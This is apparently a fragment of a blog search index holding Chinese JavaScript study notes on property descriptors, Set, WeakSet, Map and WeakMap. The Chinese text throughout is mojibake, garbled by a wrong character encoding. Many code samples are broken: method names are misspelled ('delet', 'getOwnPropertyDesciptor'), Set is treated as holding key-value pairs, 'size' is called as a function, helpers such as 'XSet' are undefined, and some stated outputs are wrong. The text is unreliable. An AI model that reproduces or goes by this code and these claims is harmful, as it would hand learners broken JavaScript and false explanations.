[å±æ€§å1ï¼Œå±æ€§å2ï¼Œâ€¦.]å¯¹è±¡å±æ€§â€‹\tECMA-262ä½¿ç”¨ä¸€äº›å†…éƒ¨ç‰¹æ€§æè¿°å±æ€§ç‰¹å¾ï¼Œç”±ä¸ºJavascriptå®ç°å¼•æ“çš„è§„èŒƒå®šä¹‰çš„ã€‚ä¸èƒ½ç›´æ¥è®¿é—®ï¼Œåœ¨è§„èŒƒä¸­ï¼Œä½¿ç”¨åŒä¸­æ‹¬å·ï¼Œå¦‚ [[Enumerable]] è¡¨ç¤ºã€‚æ•°æ®å±æ€§            [[Configurable]]ï¼š å±æ€§æ˜¯å¦å¯ä»¥è¢«åˆ é™¤ã€å†æ¬¡ä¿®æ”¹ ç‰¹æ€§ï¼Œtrue      false(é»˜è®¤)ï¼Œå½±å“Object.definePropertyæ–¹æ³•è°ƒç”¨                  [[Enuumerable]]ï¼šå±æ€§æ˜¯å¦å¯ä»¥æšä¸¾ï¼Œtrue      false(é»˜è®¤) ï¼Œä¼šå½±å“Object.key()æ˜¾ç¤ºè¿™ä¸ªæ–¹æ³•                  [[writable]]ï¼šå€¼æ˜¯å¦å¯ä»¥é‡å†™ï¼Œtrue      false(é»˜è®¤)ï¼Œä¸ä½¿ç”¨definePropertyæ—¶ï¼Œå±æ€§å€¼ä¸ºtrueï¼›ä½¿ç”¨åé»˜è®¤å€¼ä¸ºfalse      [[value]]ï¼šå±æ€§å€¼ï¼Œé»˜è®¤ä¸ºundefinedâ€‹\tåœ¨æ˜¾æ€§æ·»åŠ å±æ€§åˆ°å¯¹è±¡ä¹‹åï¼Œé™¤äº†[[value]]ç»‘å®šèµ‹äºˆçš„å€¼ï¼Œå…¶ä»–å€¼éƒ½ä¼šè¢«è®¾ç½®ä¸ºtrueã€‚ä¿®æ”¹å±æ€§çš„é»˜è®¤ç‰¹æ€§ï¼Œéœ€è¦ä½¿ç”¨Object.defineProperty()æ–¹æ³•ã€‚â€‹\tObject.defineProperty(ç›®æ ‡å¯¹è±¡obj, éœ€ä¿®æ”¹çš„å±æ€§åprop, å…¶ç‰¹æ€§descriptor)Object.defineProperty(obj, 'num', {value:1000}); // writable=false, éä¸¥æ ¼æ¨¡å¼ä¸‹æ— æ•ˆï¼›ä¸¥æ ¼æ¨¡å¼ä¸‹æŠ¥é”™Object.defineProperty(obj, 'id', {writabel:false}); è®¿é—®å™¨å±æ€§            [[Configurable]]ï¼š å±æ€§æ˜¯å¦å¯ä»¥è¢«åˆ é™¤ã€å†æ¬¡ä¿®æ”¹ ç‰¹æ€§ã€æ˜¯å¦å¯ä»¥æ”¹ä¸ºæ•°æ®å±æ€§ï¼Œtrue (é»˜è®¤)      falseï¼Œ                  [[Enuumerable]]ï¼šå±æ€§æ˜¯å¦å¯ä»¥é€šè¿‡for-inæšä¸¾ï¼Œtrue (é»˜è®¤)      falseï¼Œä¼šå½±å“Object.key()æ˜¾ç¤ºè¿™ä¸ªæ–¹æ³•      [[Get]]ï¼šè·å–å‡½æ•°ï¼Œåœ¨è¯»å–å±æ€§æ˜¯è°ƒç”¨ï¼Œé»˜è®¤å€¼ä¸ºundefined[[Set]]ï¼šè®¾ç½®å‡½æ•°ï¼Œåœ¨è¯»å–å±æ€§æ˜¯è°ƒç”¨ï¼Œé»˜è®¤å€¼ä¸ºundefinedâ€‹\tä¸åŒ…å«æ•°æ®å€¼ï¼Œget å’Œ set åˆç§°ä¸ºå¯¹è±¡å±æ€§ç›‘è§†å™¨ï¼Œç”¨äºè·å–å’Œè®¾ç½®å€¼â€‹\tè®¿é—®å™¨å±æ€§ä¸èƒ½ç›´æ¥å®šä¹‰ï¼Œå¿…é¡»ä½¿ç”¨ Object.defineProperty()let value = 10;let person = {    age:29;    name:'å¼ ä¸‰'}Object.defineProperty(person,'age',{    // getå‡½æ•°(getter) -- å±æ€§å€¼è¢«æ˜ å°„åˆ°getterä¸Š    get:function(){\t\t// å½“ person.age è¢«è¯»å–æ—¶ï¼ˆæ¯æ¬¡è¯»å–ï¼Œéƒ½ä¼šè§¦å‘getterï¼‰        return value;    } // person.age = 10    set(value){    \t// å½“ ä¿®æ”¹person.ageå€¼æ—¶ï¼Œæ–°å€¼ä½œä¸ºå½¢å‚valueä¼ é€’\t}})è¯»å–å±æ€§ç‰¹æ€§Object.getOwnPropertyDesciptor()å¯ä»¥è·å–æŒ‡å®šå±æ€§çš„å±æ€§æè¿°ç¬¦ã€‚let book = new Object()Object.defineProperties(book,{    year_:{ value:2001; }    year:{    \tget: function() { return this.year_; }\t\tset: function(newValue) { this.year_ = newValue; } \t}})// æ•°æ®å±æ€§ï¼šlet value_Descriptor = Object.getOwnPropertyDesciptor(book, 'year_');value_Descriptor.value; // 2001value_Descriptor.set // getã€set = undefinedvalue_Descriptor.configurable // false// è®¿é—®å±æ€§ï¼šlet access_Descriptor = Object.getOwnPropertyDesciptor(book, 'year');access_Descriptor.value; // undefinedaccess_Descriptor.set; // getã€set = functionaccess_Descriptor.enumerable; // false;Object.getOwnPropertyDesciptors()é™æ€æ–¹æ³•ï¼Œåœ¨æ¯ä¸ªè‡ªæœ‰å±æ€§ä¸Šè°ƒç”¨Object.getOwnPropertyDesciptor()å¹¶åœ¨ä¸€ä¸ªæ–°å¯¹è±¡ä¸­è¿”å›ä»–ä»¬ã€‚ES6 å¯¹è±¡è¯­æ³•ç³–  å±æ€§å€¼ç®€å†™ï¼ˆé”®å€¼åŒåï¼‰let name = 'matter'let person = { name: name };// ç­‰ä»·äºlet person = { name };â€‹\tä»£ç å‹ç¼©ç¨‹åºä¼šåœ¨ä¸åŒä½œç”¨åŸŸå†…ä¿ç•™å±æ€§åï¼Œç¼–è¯‘å™¨ä¼šä¿ç•™åˆå§‹æ ‡è¯†ç¬¦function makePeraon(a){    return { name: a };}      å¯è®¡ç®—å±æ€§ï¼šä½¿ç”¨å˜é‡å€¼ä½œä¸ºå±æ€§    :one:å¿…é¡»å…ˆå£°æ˜å¯¹è±¡ï¼› :two:ä½¿ç”¨ä¸­æ‹¬å· â€”â€” å¯¹è±¡å±æ€§é”®å‘Šè¯‰è¿è¡Œæ—¶å°†å…¶ä½œä¸ºJavaScriptè¡¨è¾¾å¼è€Œä¸æ˜¯å­—ç¬¦ä¸²æ±‚å€¼  const nameKey = 'name';let person = {    [nameKey]: 'Matt'}â€‹\tJavaScriptè¡¨è¾¾å¼æ±‚å€¼ï¼Œå¯ä»¥æ­é…å¤åˆ¶è¡¨è¾¾å¼const className = ObjectClassfunction getUniqueKey(key){    return `${className}_${key}`}let person = {    [getUniqueKey(namekey)] : 'Matt'}// person = { ObjectClass_nameKey:'Matt' };â€‹\tJavaScriptè¡¨è¾¾å¼æ±‚å€¼å¯èƒ½æŠ›å‡ºä»»ä½•é”™è¯¯ï¼Œéƒ½ä¼šä¸­æ–­å¯¹è±¡åˆ›å»º"
  },
  
  {
    "title": "2.11.é›†åˆå¼•ç”¨ç±»å‹ï¼ˆSetï¼‰",
    "url": "/posts/2.11.%E9%9B%86%E5%90%88%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B-Set/",
    "categories": "JavaScript, å¼•ç”¨ç±»å‹",
    "tags": "javascriptBase",
    "date": "2022-08-16 00:00:00 +0800",
    





    
    "snippet": "Set &amp; WeakSet      Setç±»æ•°ç»„ï¼Œä¸å¯æ”¾é‡å¤æ•°æ®ï¼Œä¸çº¦æŸä¸åŒç±»å‹çš„æ•°æ®        å¯¹è±¡ï¼Œçº¦æŸä¸åŒç±»å‹çš„æ•°æ®ï¼ˆåŸå§‹å€¼è¿˜æ˜¯å¯¹è±¡å¼•ç”¨ï¼Œç»Ÿç»Ÿè½¬æ¢ä¸ºå­—ç¬¦ä¸²å­˜å‚¨ï¼‰ï¼ŒåŒåå±æ€§ä¼šè¦†ç›–        Set ä½¿ç”¨ key:key æ–¹å¼å­˜å‚¨ï¼š    set.values === set[Symbol.iterator] // trueset.keys === set[Symbol....",
    "content": "Set &amp; WeakSet      Setç±»æ•°ç»„ï¼Œä¸å¯æ”¾é‡å¤æ•°æ®ï¼Œä¸çº¦æŸä¸åŒç±»å‹çš„æ•°æ®        å¯¹è±¡ï¼Œçº¦æŸä¸åŒç±»å‹çš„æ•°æ®ï¼ˆåŸå§‹å€¼è¿˜æ˜¯å¯¹è±¡å¼•ç”¨ï¼Œç»Ÿç»Ÿè½¬æ¢ä¸ºå­—ç¬¦ä¸²å­˜å‚¨ï¼‰ï¼ŒåŒåå±æ€§ä¼šè¦†ç›–        Set ä½¿ç”¨ key:key æ–¹å¼å­˜å‚¨ï¼š    set.values === set[Symbol.iterator] // trueset.keys === set[Symbol.iterator] \t// trueset.values() === set.keys() // false  set.entries(); // è¿”å›é›†åˆä¸­çš„æ¯ä¸ªå€¼é‡å¤å‡ºç°// 0: {\"æå››\" =&gt; \"æå››\"}// 1: {\"ç‹äº”\" =&gt; \"ç‹äº”\"}// 2: {\"å´å…­\" =&gt; \"å´å…­\"}      å®šä¹‰const m = new Set() // ç©ºæ˜ å°„ï¼Œå¯ç”¨constå®šä¹‰// åŒæ—¶åˆå§‹åŒ–å®ä¾‹ï¼Œéœ€è¦ä¼ å…¥ä¸€ä¸ªå¯è¿­ä»£å¯¹è±¡â€”â€”åŒ…å«é”®å€¼å¯¹çš„æ•°ç»„// æ¯ä¸ªé”®å€¼å¯¹æŒ‰é¡ºåºæ’å…¥åˆ°æ–°æ˜ å°„å®ä¾‹ä¸­let Set = new Set([\"æå››\", \"ç‹äº”\", \"å´å…­\"]);console.log(Set); // 3// ä½¿ç”¨è‡ªå®šä¹‰å‡½æ•°åˆå§‹åŒ–const Set2 = new Set({    [Symbol.iterator]: function*() {        yield 'value1';        yield 'key2','value2';        yield 'key3','value3';    }})console.log(mep2.size); // 3const set = new Set([1,2,3,4,6,4,2,1]);  // Set(5)Â {1, 2, 3, 4, 6} è‡ªåŠ¨å»é‡// å£°æ˜æ—¶å˜é‡ä¸ºå­—ç¬¦ä¸²ï¼Œå°†å­—ç¬¦ä¸²å±•å¼€ä¸ºå•ä¸ªå­—ç¬¦èµ‹å€¼æˆå¯¹è±¡,ï¼Œå¹¶è‡ªåŠ¨å»é‡const set = new Set('hello');  // Set(4)Â {'h', 'e', 'l', 'o'} è‡ªåŠ¨å»é‡å¢åˆ æ”¹æŸ¥const set = new Set([['firstName','matter'],['lastName','petter']]);// æ–°å¢å€¼,è¿”å›Setå¯¹è±¡,å¯ä»¥é“¾å¼å®šä¹‰set.add(\"name\",\"å¼ ä¸‰\").add('age',10)// æŸ¥è¯¢å€¼ // 1. é€šè¿‡é”®æŸ¥æ‰¾: set.has(key)set.has('firstName'); // trueset.has('matter'); //false// 2. è¿”å›æ‰€æœ‰é”® set.keys(); // SetIteratorÂ {'æå››', 'ç‹äº”', 'å´å…­'}// 3. è¿”å›æ‰€æœ‰å€¼set.values(); // SetIteratorÂ {'æå››', 'ç‹äº”', 'å´å…­'}// 4. è¿”å›æ‰€æœ‰é”®å€¼å¯¹set.entries(); //SetIteratorÂ {'æå››' =&gt; 'æå››', 'ç‹äº”' =&gt; 'ç‹äº”', 'å´å…­' =&gt; 'å´å…­'} // æŸ¥è¯¢ä¸ªæ•°set.size() // 3// åˆ é™¤// 1. delete(key) æ˜¯å¦æˆåŠŸåˆ é™¤ set.delet('firstName'); // tureset.delet('firstName'); // false// 2. clear() å…¨åˆ ,æ— è¿”å›å€¼set.clear(); // undefined Set.size=0è½¬æ¢      setæ¢æ•°ç»„ï¼š                  Array.from(set);                    [...set]                  æ•°ç»„æ¢setï¼šå»é‡å¤    // æ•°ç»„å»é‡const set = new Set(['a','b','a','b']);const ary = [...set]   [... new Set(array)]      éå†  å–å€¼ï¼š\tset.value / set.entries  forEach( function(value, key, arr))ï¼švalue = key  for-ofï¼š set.valueè‡ªå®šä¹‰æ“ä½œï¼šäº¤å¹¶å·®â€‹\tSet å’Œ Map ä¸€æ ·å¯ä»¥å­˜æ”¾å„ç§æ•°æ®ç±»å‹ä½œä¸ºå€¼ï¼Œä½¿ç”¨ SameValueZero æ“ä½œåˆ¤æ–­æ˜¯å¦ç›¸ç­‰ï¼ˆç±»ä¼¼äºä¸¥æ ¼ç›¸ç­‰===ï¼‰  å¹¶ï¼šåˆå¹¶å¤šä¸ªsetï¼Œå»é‡const a = new Set([1,2,3,4,5,3,2,4])const b = new Set([1,2,3,4,5,7,8,9])// ç¬¬ä¸€ç§æ–¹æ³•new Set([...a,...b]) // Set(8) {1, 2, 3, 4, 5, 7, 8, 9}// ç¬¬äºŒç§æ–¹æ³•function union(a, ...bSets){    const unionSet = new Set(a);    for (const b of bSets){        for(const bValue of b){            unionSet.add(bValue);        }    }    return unionSet;}unionf(a, b) // Set(8) {1, 2, 3, 4, 5, 7, 8, 9}  å·®ï¼š å±•å¼€[a]æ¯ä¸ªå…ƒç´ è¿‡æ»¤æ‰ bå­˜åœ¨ çš„å…ƒç´ // ç¬¬ä¸€ç§æ–¹æ³•new Set(\t[...a].filter(function(item){        return !b.has(item);    }))// ç¬¬äºŒç§æ–¹æ³•function difference(a, b) {    const differenceSet = new XSet(a);    for(const bValue of b){        if(b.has(aValue)) differenceSet.delete(bValue);    }    return differenceSet;}  äº¤ï¼šå±•å¼€[a]æ¯ä¸ªå…ƒç´ è¿‡æ»¤æ‰ bä¸å­˜åœ¨ çš„å…ƒç´ // ç¬¬ä¸€ç§æ–¹æ³•new Set(\t[...a].filter(function(item){     \treturn b.has(item);       }))// ç¬¬äºŒç§æ–¹æ³•: è¿”å›ä¸¤ä¸ªæˆ–æ›´å¤šé›†åˆçš„äº¤é›†function intersetion(a, ...bSets) {    const intersectionSet = new XSet(a);    for (const aValue of intersectionSet){        for(const b of bSets){            if(!b.has(aValue)) intersectionSet.delete(aValue);        }    }    return intersectionSet;}                              å¯¹ç§°å·®é›† ï¼š æ‰€æœ‰ä¸å±äºAâˆ©Bçš„å…ƒç´ çš„é›†åˆï¼Œ$Aâ–³B = {x          xâˆˆAâˆªB,xâˆ‰Aâˆ©B} = (AâˆªB) â€” (Aâˆ©B)$                    function symmetricDifference(a, b){    return a.union(b).difference(a.intersection(b));    // a.union(b) å–å…¨é›†    // a.intersection(b) å–åŒæ—¶å±äºaã€bäº¤é›†    // c.difference(d) \t// å…¨é›†ä¸‹ä¸å±äºäº¤é›†çš„éƒ¨åˆ†}  ç¬›å¡å°”ç§¯ ï¼šXÃ—Yï¼Œç¬¬ä¸€ä¸ªå¯¹è±¡æ˜¯Xçš„æˆå‘˜è€Œç¬¬äºŒä¸ªå¯¹è±¡æ˜¯Yçš„æ‰€æœ‰å¯èƒ½æœ‰åºå¯¹function cartersianProduct(a, b){    const set = new Set();    for(const aValue of a){        for(const bValue of b){            set.add([aValue, bValue]); // æ•°ç»„çš„é›†åˆ        }    }    return set;}  é›†åˆçš„å¹‚é›† ï¼šé›†åˆä¸­æ‰€æœ‰çš„å­é›†ï¼ˆåŒ…æ‹¬å…¨é›†å’Œç©ºé›†ï¼‰æ„æˆçš„é›†æ—function powerSet(a){    const powerSet = new Set();    powerSet.add(new Set()); // åŒ…å«ç©ºé›†    for(const aVal of a){        for(const set of new Set(powerSet)){            powerSet.add(new Set(set).add(aVal))        }    }}WeakSetå€¼å¿…é¡»æ˜¯å¼•ç”¨ç±»å‹ï¼Œä¿å­˜å¯¹è±¡æ•°æ®ã€‚ ä¸æ˜¯æ­£å¼å¼•ç”¨ï¼Œä¸ä¼šå½±å“åƒåœ¾å›æ”¶æœºåˆ¶ã€‚å¯¹DOMæ“ä½œæ—¶ï¼ŒDOMèŠ‚ç‚¹åˆ é™¤åæ— éœ€ä¿®æ”¹WeakSetçš„å¼•ç”¨å¼±å¼•ç”¨ç±»å‹çš„ç‰¹æ€§      å¼ºå¼•ç”¨ç±»å‹çš„ç‰¹æ€§    å¯¹è±¡ã€æ•°ç»„å¯¹åŒä¸€å—å†…å­˜ç©ºé—´å¼•ç”¨æ—¶ï¼Œä¼šå°†ç©ºé—´å¼•ç”¨æ•°+1    å½“æ‰€æœ‰å¯¹è¯¥å†…å­˜ç©ºé—´å¼•ç”¨è¢«ç½®ä¸ºnullæ—¶ï¼ŒJavaScriptå¯¹è¯¥å†…å­˜æ•°æ®å½“ä½œåƒåœ¾å¤„ç†ï¼Œå›æ”¶ç©ºé—´        å¼±å¼•ç”¨ç±»å‹çš„ç‰¹æ€§    WeakSetä½œä¸ºå¼±å¼•ç”¨ç±»å‹ä½¿ç”¨å†…å­˜ç©ºé—´æ—¶ï¼Œä¸ä¼šå°†ç©ºé—´å¼•ç”¨æ•°+1    å½“è¯¥å†…å­˜ç©ºé—´å¼•ç”¨æ•°ä¸º0æ—¶ï¼ŒJavaScriptå¯¹å†…å­˜å›æ”¶ä¸ä¼šé€šçŸ¥WeatSetå¼•ç”¨æ•°æ®ä¸å­˜åœ¨    WetSetè®¿é—®ä¸ºNo propertise    æ— æ³•ä½¿ç”¨å¾ªç¯  æ— æ³•è®¿é—®.value .key .sizeç­‰å±æ€§  æ— éœ€å°†å¼•ç”¨èµ‹å€¼ä¸ºnull"
  },
  
  {
    "title": "2.10.é›†åˆå¼•ç”¨ç±»å‹ï¼ˆMapï¼‰",
    "url": "/posts/2.10.%E9%9B%86%E5%90%88%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B-Map/",
    "categories": "JavaScript, å¼•ç”¨ç±»å‹",
    "tags": "javascriptBase",
    "date": "2022-08-14 00:00:00 +0800",
    





    
    "snippet": "Map &amp; WeakMapä¸åŒäºSetã€å¯¹è±¡ï¼ŒMapå…ƒç´ é”®å€¼å¯¹å¯ä»¥ä¸ºå¯¹è±¡ã€å­—ç¬¦ä¸²ã€å‡½æ•°ã€æ•°å­—ç­‰ï¼Œä½†å¿…é¡»æ˜¯å¯è¿­ä»£çš„æ•°æ®ç±»å‹å®šä¹‰const m = new Map() // ç©ºæ˜ å°„ï¼Œå¯ç”¨constå®šä¹‰// åŒæ—¶åˆå§‹åŒ–å®ä¾‹ï¼Œéœ€è¦ä¼ å…¥ä¸€ä¸ªå¯è¿­ä»£å¯¹è±¡â€”â€”åŒ…å«é”®å€¼å¯¹çš„æ•°ç»„// æ¯ä¸ªé”®å€¼å¯¹æŒ‰é¡ºåºæ’å…¥åˆ°æ–°æ˜ å°„å®ä¾‹ä¸­let map = new Map([    [function(){},\"æå››\"],...",
    "content": "Map &amp; WeakMapä¸åŒäºSetã€å¯¹è±¡ï¼ŒMapå…ƒç´ é”®å€¼å¯¹å¯ä»¥ä¸ºå¯¹è±¡ã€å­—ç¬¦ä¸²ã€å‡½æ•°ã€æ•°å­—ç­‰ï¼Œä½†å¿…é¡»æ˜¯å¯è¿­ä»£çš„æ•°æ®ç±»å‹å®šä¹‰const m = new Map() // ç©ºæ˜ å°„ï¼Œå¯ç”¨constå®šä¹‰// åŒæ—¶åˆå§‹åŒ–å®ä¾‹ï¼Œéœ€è¦ä¼ å…¥ä¸€ä¸ªå¯è¿­ä»£å¯¹è±¡â€”â€”åŒ…å«é”®å€¼å¯¹çš„æ•°ç»„// æ¯ä¸ªé”®å€¼å¯¹æŒ‰é¡ºåºæ’å…¥åˆ°æ–°æ˜ å°„å®ä¾‹ä¸­let map = new Map([    [function(){},\"æå››\"],    [{},\"ç‹äº”\"],    [1,\"å´å…­\"]]);console.log(map); // Map(3)// ä½¿ç”¨è‡ªå®šä¹‰å‡½æ•°åˆå§‹åŒ–const map2 = new Map({    [Symbol.iterator]: function*() {        yield ['key1','value1'];        yield ['key2','value2'];        yield ['key3','value3'];    }})console.log(mep2.size); // 3å¢åˆ æ”¹æŸ¥const map = new Map([['firstName','matter'],['lastName','petter']]);// æ–°å¢å€¼,è¿”å›Mapå¯¹è±¡,å¯ä»¥é“¾å¼å®šä¹‰map.set(\"name\",\"å¼ ä¸‰\").set('age',10)// æŸ¥è¯¢å€¼ // 1. é€šè¿‡é”®æŸ¥æ‰¾: map.has(key)map.has('firstName'); // truemap.has('matter'); //false// 2. è¿”å›æ‰€æœ‰é”®map.keys();// 3. è¿”å›æ‰€æœ‰å€¼map.values();// 4. è¿”å›æ‰€æœ‰é”®å€¼å¯¹map.entries();// æŸ¥è¯¢ä¸ªæ•°map.size() // 3// åˆ é™¤// 1. delete(key) æ˜¯å¦æˆåŠŸåˆ é™¤ map.delet('firstName'); // turemap.delet('firstName'); // false// 2. clear() å…¨åˆ ,æ— è¿”å›å€¼map.clear(); // undefined map.size=0å¾ªç¯Map å®ä¾‹ä¼šç»´æŠ¤æ’å…¥é¡ºåºï¼Œæä¾›ä¸€ä¸ªè¿­ä»£å™¨ï¼ˆIznteratorï¼‰ç”Ÿæˆ [key, value]å½¢å¼çš„æ•°ç»„ã€‚å¯ä»¥ä½¿ç”¨entries() / Symbol.iterator è·å¾—è¿™ä¸ªè¿­ä»£å™¨ã€‚å› ä¸º entries() æ˜¯é»˜è®¤è¿­ä»£å™¨ï¼Œæ‰€ä»¥å¯ä»¥è°ƒç”¨ å±•å¼€æ“ä½œç¬¦ï¼Œå°†Mapå¯¹è±¡è½¬æ¢ä¸ºæ•°ç»„å¯¹è±¡  forå¾ªç¯for(const [key,value] of map.entries()){    console.log(value,key);}for(const pair of map[Symbol.iterator]){    console.log(pair);}map.entries() === map[Symbol.iteratror] // true  forEachå¾ªç¯map.forEache((value,key) =&gt; {    console.log(value,key);},this)ä¿®æ”¹å€¼â€‹\tâ€”â€” é”®æ˜¯å¼•ç”¨ç±»å‹æ—¶ï¼Œä¿®æ”¹å†…éƒ¨æ•°æ®ä¸å½±å“æ˜ å°„çš„å€¼// é”®ä¸ºå­—ç¬¦ä¸²æ—¶ï¼Œä¿®æ”¹æ— æ•ˆconst strMap = ([    ['key1','val1']])for (let key of strMap.keys()){    key = 'newKey';    console.log(key); // newKey    console.log('newKey'); // undefined    console.log(strMap.get('key1')); // val1}// é”®ä¸ºå¯¹è±¡å±æ€§æ—¶ï¼Œå†…éƒ¨æ˜ å°„ä¾ç„¶å¼•ç”¨ç›¸åŒçš„åœ°å€const objKey = {id:1};const objMap([    [objKey,'val2']])for (let key of objKey.keys()){    key.id = 'newKey';    console.log(key); // {id:\"newKey\"}    console.log(objKey.get(objKey)); // 'val2'}è½¬æ¢      æ•°ç»„ ...map æˆ–è€… [... map]        åˆ©ç”¨æ•°ç»„è¿‡æ»¤å™¨    [... map].filter(item =&gt; {return item[1].include(\"111\")} ) // item[1] æŒ‡é”®å        è½¬æ¢å›mapç±»å‹  ä¸Objectç›¸æ¯”çš„ä¼˜åŠ¿  å†…å­˜å ç”¨ï¼ˆå¤šå­˜å‚¨ï¼‰ï¼šåœ¨ç»™å®šå›ºå®šå†…å­˜å¤§å°é‡Œï¼ŒMap å¯ä»¥æ¯” Object å¤šå­˜å‚¨ 50% çš„é”®å€¼å¯¹  æ’å…¥æ€§èƒ½ï¼ˆå¿«ï¼‰ï¼šæ¶ˆè€—å¤§è‡´ç›¸å½“  æŸ¥æ‰¾é€Ÿåº¦ï¼ˆæ€§èƒ½å·®å¼‚å°ï¼‰ï¼šObject åœ¨ç±»æ•°ç»„ä½¿ç”¨çš„æƒ…å†µä¸‹ï¼Œæ›´å¿«  åˆ é™¤æ€§èƒ½          åˆ é™¤ object  åªèƒ½ä½¿ç”¨ ä¼ªåˆ é™¤å¯¹è±¡å±æ€§çš„æ“ä½œï¼Œ å€¼è®¾ç½®ä¸ºundefined æˆ–è€… null      åˆ é™¤ map ï¼Œdelete() æ“ä½œæ¯”æ’å…¥å’ŒæŸ¥æ‰¾æ›´å¿«      ä½¿ç”¨åœºæ™¯  â€‹\tè¡¨å•æäº¤å‰ï¼Œæ£€æŸ¥æŸäº›å…ƒç´ çš„çŠ¶æ€ï¼Œå½“è¿”å›å€¼æ˜¯falseæ—¶ï¼Œé˜»æ­¢æäº¤å¹¶è·³å‡ºå¼¹çª—function post(){    let map = new Map();    let inputs = document.querySelectorAll(\"[error]\");    inputs.forEach(item =&gt; {        map.set(item,{            error:item.getAttribute(\"error\"),            status:item.checked        })    })}return [...map].every(([elem,config])=&gt;{    config.status || alert(config.error); // æˆ– çŸ­è·¯è¿ç®—    // å·²å‹¾é€‰status=trueï¼Œé€€å‡ºåˆ¤æ–­ï¼›    // å¦åˆ™ï¼Œæœªå‹¾é€‰status=falseï¼Œæ‰§è¡Œç¬¬äºŒä¸ªè¯­å¥ï¼Œè·³å‡ºå¼¹çª—    return config.status;})weakMapé”®åªèƒ½æ˜¯ Object æˆ–è€… Objectç±»å‹ï¼Œå…¶ä»–éå¯¹è±¡è®¾ç½®ä¸ºé”®ä¼šæŠ›å‡º TypeErrorï¼› å€¼çš„è®¾ç½®æ²¡æœ‰é™åˆ¶// åˆå§‹åŒ– æ˜¯ä¸€ä¸ªå…¨æœ‰å…¨æ— çš„æ“ä½œconst wm = new WeakMap([    [key1, 'val1'], [key2, 'val2'], ['errkey', 'val3'] // 'errkey' å°†å¯¼è‡´åˆå§‹åŒ–å¤±è´¥])// ä½†å¯ä»¥å…ˆæŠŠåŸå§‹å€¼åŒ…è£…æˆå¯¹è±¡å†ä½œä¸ºé”®const objStr = new String('errKey');wm.set(objStr, 'val3')// weakMap æ‹¥æœ‰äº Map ç›¸ä¼¼çš„æ–¹æ³•ï¼›ä½†æ²¡æœ‰ clear() â€”â€” éšæ—¶éƒ½å¯ä»¥è¢«é”€æ¯  å¼±é”®ï¼š é”®ä¸å±äºæ­£å¼å¼•ç”¨ï¼Œä¸ä¼šé˜»æ­¢åƒåœ¾å›æ”¶ï¼› å€¼çš„å¼•ç”¨ï¼Œå±äºæ­£å¼å¼•ç”¨ï¼Œå½±å“åƒåœ¾å›æ”¶åªè¦å­˜åœ¨é”®å€¼å¯¹äºæ˜ å°„ä¸­ï¼Œå¹¶å½“ä½œå¯¹å€¼çš„å¼•ç”¨ï¼Œå€¼å°±ä¸ä¼šè¢«åƒåœ¾å›æ”¶ã€‚  ä¸å¯è¿­ä»£é”®ï¼šä¸èƒ½åœ¨ä¸çŸ¥å¯¹è±¡å¼•ç”¨çš„æƒ…å†µä¸‹ä»å¼±æ˜ å°„ä¸­è·å¾—å€¼ã€‚ä¹‹æ‰€ä»¥é™åˆ¶ åªèƒ½ç”¨Object ä½œä¸ºé”®ï¼Œæ˜¯ä¸ºäº†ä¿è¯é€šè¿‡ é”®å¯¹è±¡å¼•ç”¨ï¼ˆå†…å­˜å”¯ä¸€å€¼ï¼‰æ‰èƒ½å–å¾—å€¼ä½¿ç”¨weakMapç§æœ‰å˜é‡ç§æœ‰å˜é‡å­˜å‚¨åœ¨å¼±æ˜ å°„ä¸­ï¼Œä»¥å¯¹è±¡å®ä¾‹ä¸ºé”®ï¼Œä»¥ç§æœ‰æˆå‘˜ä¸ºå€¼const User = (() =&gt; {    const wm = new WeakMap(); // é—­åŒ…å†…çš„wakMap ä¸æš´éœ²åœ¨å¤–ï¼Œç»Ÿä¸€å®ä¾‹æ‰ä½¿ç”¨åŒä¸€ä¸ªweakMap    // ä¸”ç”Ÿå­˜æ—¶é—´ä¸å®ä¾‹åŒæ­¥ï¼Œè€Œä¸æ˜¯ä¸ç±»åŒæ­¥    class User {        // ...        setPrivate(property, value){            const privaterMembers = wm.get(this) || {}; // è·å–å½“å‰å®ä¾‹            privaterMembers[property] = value; // weakMap æ–°å¢é”®å€¼å¯¹            wm.set(this, privaterMembers); // è¿”å›weakMap        }        getPrivate(property) {\t\t\treturn wm.get(this)[property]        }        // ...    };    return User;})();// cosnt User = ()()const user = new User('å¼ ä¸‰');user.getPrivate(id);ä¸ä½¿ç”¨é—­åŒ…ï¼Œç›´æ¥å®šä¹‰ classï¼Œå¤–éƒ¨å¯ä»¥é€šè¿‡å¯¹è±¡å®ä¾‹çš„å¼•ç”¨è·å¾—ç§æœ‰å˜é‡// wm åœ¨ å¤–éƒ¨å®šä¹‰ï¼Œä½¿ç”¨åŒä¸€ä¸ªweakmapï¼Œå¯ä»¥é€šè¿‡å®ä¾‹è·å–wm.get(user)[user.getPrivate];ä½†ä¹Ÿæ˜¯ä»£ç å®Œå…¨é™·å…¥ES6ä¹‹å‰çš„ é—­åŒ…ç§æœ‰å˜é‡æ¨¡å¼æ“ä½œDOMå…ƒç´ å¯¹è±¡&lt;div name=\"1\"&gt;11&lt;/div&gt;&lt;div name=\"2\"&gt;22&lt;/div&gt;ä½¿ç”¨ Map å…³è”å…ƒæ•°æ®ï¼šlet map = new Map();// å¯¹åº”DOMä¸­æ¯ä¸ªdivå…ƒç´ å¯¹è±¡ï¼Œå­˜å…¥Mapä¸­ï¼Œåç»­ä¸éœ€è¦æ“ä½œDOMç›´æ¥æ“ä½œMapdocument.querySelectorAll(\"div\").forEach(item =&gt;{    map.set(item,{        content1:item.getAttribute(\"name\"),        content2:item.innerHTML    })})// map:Map(2) [[Entries]] 0:{div=&gt; Object}// 0:{key:div, value: {content:\"1\",content2:\"11\"}}console.log(map);map.forEach((config, elem)=&gt;{    // map.item --        // this:undefined        // config:{content1:\"1\", content2:\"11\"}        // elem: div    elem.addEventListener(\"click\", ()=&gt;{        alert(config.content1)    })})â€‹\tå­˜åœ¨é—®é¢˜ï¼š å½“å…³è”çš„å…ƒæ•°æ®ä»DOMæ ‘åˆ é™¤åï¼Œå…¶å€¼ä¾ç„¶è¢« Mapå®ä¾‹ å¼•ç”¨è€Œä¸èƒ½åˆ é™¤ï¼Œæ‰€ä»¥å¯¹åº”çš„DOMèŠ‚ç‚¹ä¾ç„¶æ»ç•™åœ¨å†…å­˜ä¸­ï¼Œé™¤éæ˜ç¡®é”€æ¯â€‹\tä½¿ç”¨å¼±æ˜ å°„æ˜¯ï¼Œä»£ç æ‰§è¡Œå®Œæ¯• weakmap 